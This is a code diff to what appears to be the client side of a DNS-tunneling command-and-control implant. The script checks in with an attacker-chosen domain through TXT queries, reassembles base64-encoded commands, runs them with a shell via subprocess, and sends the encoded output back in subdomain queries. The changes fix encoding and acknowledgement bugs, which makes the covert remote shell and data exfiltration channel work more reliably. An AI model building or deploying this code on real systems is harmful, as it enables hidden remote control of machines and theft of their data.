@@ -19,10 +19,10 @@ maxAReq = 63
 maxResp = 253
 
 def toBytes(input):
-    if isinstance(input, str): return input.encode('utf8')
+    if isinstance(input, str): return input.encode('utf-8')
     else: return input
 def toString(input):
-    if isinstance(input, bytes): return input.decode('utf8')
+    if isinstance(input, bytes): return input.decode('utf-8')
     else: return input
 
 def decode64(b64):
@@ -69,11 +69,11 @@ def main():
             sleep(args.timeout)
             subd = b"CHK" + encode32(str(datetime.datetime.now())) # check in for commands
             if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
-            answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
+            answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
             answer = answer[0].to_text().replace('"','') # avoid quotes in answer
             msgType = answer[:3]
             print(f"{OR}answer is {OV}{answer}{OR}, and it's {OV}{len(answer)}{OR} bytes long{OM}")
-            if len(answer) > 3: answer = decode64(answer[3:]).decode('UTF8')
+            if len(answer) > 3: answer = decode64(answer[3:]).decode('utf-8')
             if debuggin: print(f"{OV}Received answer {OR}{answer}{OV} of type {OR}{msgType}{OM}")
             if msgType == "NUL": # nop if nothing from server
                 if debuggin: print(f"{OV}NUL from server{OM}")
@@ -84,39 +84,44 @@ def main():
                 if debuggin: print(f"{OV}HDR from server, answer is {OR}{answer}{OM}")
                 cmdPktCt = int(answer) # how many lines long is the command?
                 print(f"{OR}Command is {OV}{cmdPktCt}{OR} chunks long{OR}")
-                command = b""
+                command64 = ""
                 for i in range(cmdPktCt): # get all lines
                     subd = b"CON" + encode32(str(datetime.datetime.now()))
-                    answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
-                    answer = answer[0].to_text()
+                    answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+                    answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                     msgType = answer[:3]
-                    command += decode64(answer[3:])
+                    command64 += answer[3:]
+                    print(f"{OR}msgType is {OV}{msgType}{OR} and command64 so far is {OR}{command64}{OM}")
                 # output = subprocess.check_output("cat /etc/services", shell=True)
-                print(f"{OR}Executing command {OV}{command.decode('UTF8')}{OR}")
-                output = subprocess.check_output(command.decode("UTF8"), shell=True)
+                print(f"{OR}Executing command64 {OV}{command64}{OR}", end="")
+                command = decode64(command64).decode('utf-8')
+                print(f"{OR} a.k.a. {OV}{command}{OM}")
+                output = subprocess.check_output(command, shell=True)
                 print(f"{OR}Command output: {OV}{output}{OM}")
                 codedOutput = encode32(output)
-                respPktCt = int(len(codedOutput) / 57) + 1 # number of packets to send response
+                respPktCt = int(len(codedOutput) / 55) + 1 # number of packets to send response
                 subd = b"HDR" + encode32(str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
-                answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
-                answer = answer[0].to_text()
+                answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+                answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                 msgType = answer[:3]
-                chunks = wrap(codedOutput.decode('UTF8'),55)
-                if msgType != b"ACK":
-                    error = f"Expected b'ACK' from server, got {msgType}"
+                chunks = wrap(codedOutput.decode('utf-8'),55)
+                if msgType != "ACK":
+                    error = f"Expected 'ACK' from server, got {msgType}"
                     print(OE + error + OM)
                     raise Exception(error)
                 for chunk in chunks:
                     # subd = encode32("RES" + hex(i)[-2:] + chunk)
-                    subd = b"RES" + encode32(chunk.encode('UTF8'))
+                    subd = b"RES" + chunk.encode('utf-8')
                     if subd.endswith(b"-"): subd += b"0" # can't start/end subdomain with "-"
                     # if subd.startswith(b"-"): subd = b"0" + subd
                     print(f"{OR}Chunk looks like {OV}{chunk}{OR}; there are {OV}{len(chunks)}{OR} chunks.{OM}")
                     print(f"{OR}subd looks like {OV}{subd}{OM}")
-                    answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
+                    answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+                    answer = answer[0].to_text().replace('"','') # avoid quotes in answer
+                    msgType = answer[:3]
                     # if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
-                    if answer[0].to_text()[:3] != b"ACK":
-                        error = f"Expected b'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
+                    if msgType != "ACK":
+                        error = f"Expected 'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
                         print(OE + error + OM)
                         raise Exception(error)
     except KeyboardInterrupt:
